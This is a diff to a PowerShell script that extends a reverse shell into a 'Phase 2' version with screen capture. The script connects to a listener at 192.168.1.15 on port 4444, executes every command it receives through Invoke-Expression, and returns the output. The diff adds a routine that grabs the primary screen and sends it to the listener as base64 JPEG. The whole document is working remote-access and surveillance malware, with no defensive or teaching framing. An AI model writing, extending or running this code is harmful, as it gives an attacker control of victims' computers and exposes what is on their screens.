@@ -1,40 +1,55 @@
-# --- PHASE 1: CONNECTION ONLY ---
+# --- PHASE 2: CONNECTION + SCREENSHOT ---
 $ip = '192.168.1.15'
 $port = 4444
 
+# Load necessary assemblies for graphics
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+# Clean Screenshot Function
+function Get-Screenshot {
+    try {
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphic.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+        
+        $ms = New-Object System.IO.MemoryStream
+        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+        $base64 = [Convert]::ToBase64String($ms.ToArray())
+        
+        $graphic.Dispose(); $bitmap.Dispose(); $ms.Dispose()
+        return $base64
+    } catch { return "Error capturing screen: $($_.Exception.Message)" }
+}
+
 try {
-    # Create the client and connect
     $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
     $stream = $client.GetStream()
-    
-    # Setup reader and writer
     $reader = New-Object System.IO.StreamReader($stream)
     $writer = New-Object System.IO.StreamWriter($stream)
     $writer.AutoFlush = $true
 
-    # Send a "Success" message to your listener
-    $writer.WriteLine("--- Connection Established ---")
+    $writer.WriteLine("--- Phase 2 Active: Screenshot Enabled ---")
     $writer.Write("PS " + (Get-Location).Path + "> ")
 
-    # The Loop
     while($client.Connected) {
-        if ($stream.DataAvailable) {
-            $input = $reader.ReadLine()
-            if ($input -eq "exit") { break }
-            
-            # Execute command and capture output
+        $input = $reader.ReadLine()
+        if ([string]::IsNullOrWhiteSpace($input)) { continue }
+        if ($input -eq "exit") { break }
+
+        # LOGIC: Check if the user typed 'screenshot'
+        if ($input -eq "screenshot") {
+            $out = Get-Screenshot
+        } else {
             $out = try { Invoke-Expression $input 2>&1 | Out-String } catch { $_.Exception.Message }
-            
-            # Send back to listener
-            $writer.WriteLine($out)
-            $writer.Write("PS " + (Get-Location).Path + "> ")
         }
-        Start-Sleep -Milliseconds 100
+
+        $writer.WriteLine($out)
+        $writer.Write("PS " + (Get-Location).Path + "> ")
     }
 } catch {
-    # If this hits, it means it couldn't even find the IP/Port
-    Write-Error "Could not connect to $ip on port $port"
-    Pause 
+    Write-Error "Connection lost or failed: $($_.Exception.Message)"
 } finally {
     if ($client) { $client.Close() }
 }
